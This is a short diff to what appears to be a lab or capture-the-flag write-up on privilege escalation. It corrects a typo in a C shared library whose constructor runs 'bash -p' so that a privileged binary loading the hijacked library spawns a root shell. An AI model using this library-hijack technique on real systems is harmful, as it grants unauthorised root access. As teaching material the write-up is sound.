@@ -207,7 +207,7 @@ but before this we need to create the libcounter.c file:
 
 	__attribute__((constructor))
 	int main(){
-		sytem("bash -p");
+		system("bash -p");
 		return 0;
 	}
 so now we can compile the library with the command above and copy the created library to the path that the binary calls:
